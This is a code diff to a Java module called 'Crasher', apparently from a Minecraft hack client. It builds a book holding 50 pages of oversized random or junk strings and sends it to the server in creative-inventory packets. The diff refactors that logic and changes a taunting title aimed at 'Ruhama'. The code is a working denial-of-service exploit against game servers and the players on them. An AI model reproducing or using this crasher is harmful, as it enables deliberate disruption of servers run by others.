@@ -39,36 +39,31 @@ public class Crasher extends Module
         ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
         NBTTagList list = new NBTTagList();
         NBTTagCompound tag = new NBTTagCompound();
+
         String author = "Bleach";
-        String title = "\n Ruhama Owns All \n";
+        String title = "\n Ruhama Is Trash \n";
         String size = "";
+
         IntStream chars;
+
         if (this.getSettings().get(2).toMode().mode == 2)
         {
-            chars = (new Random()).ints(128, 1112063).map((ix) ->
-            {
-                return ix < 55296 ? ix : ix + 2048;
-            });
-            size = chars.limit(10500L).mapToObj((ix) ->
-            {
-                return String.valueOf((char) ix);
-            }).collect(Collectors.joining());
+            chars = (new Random()).ints(128, 1112063).map((ix) -> ix < 55296 ? ix : ix + 2048);
+            size = chars.limit(10500L).mapToObj((ix) -> String.valueOf((char) ix)).collect(Collectors.joining());
         } else if (this.getSettings().get(2).toMode().mode == 1)
         {
             size = repeat(5000, String.valueOf(1114111));
         } else if (this.getSettings().get(2).toMode().mode == 0)
         {
             chars = (new Random()).ints(32, 126);
-            size = chars.limit(10500L).mapToObj((ix) ->
-            {
-                return String.valueOf((char) ix);
-            }).collect(Collectors.joining());
+            size = chars.limit(10500L).mapToObj((ix) -> String.valueOf((char) ix)).collect(Collectors.joining());
         } else if (this.getSettings().get(2).toMode().mode == 3)
         {
             size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
         }
 
         int i;
+
         for (i = 0; i < 50; ++i)
         {
             NBTTagString tString = new NBTTagString(size);
@@ -78,6 +73,7 @@ public class Crasher extends Module
         tag.setString("author", author);
         tag.setString("title", title);
         tag.setTag("pages", list);
+
         bookObj.setTagInfo("pages", list);
         bookObj.setTagCompound(tag);
 
@@ -91,6 +87,5 @@ public class Crasher extends Module
                 this.mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(0, bookObj));
             }
         }
-
     }
 }
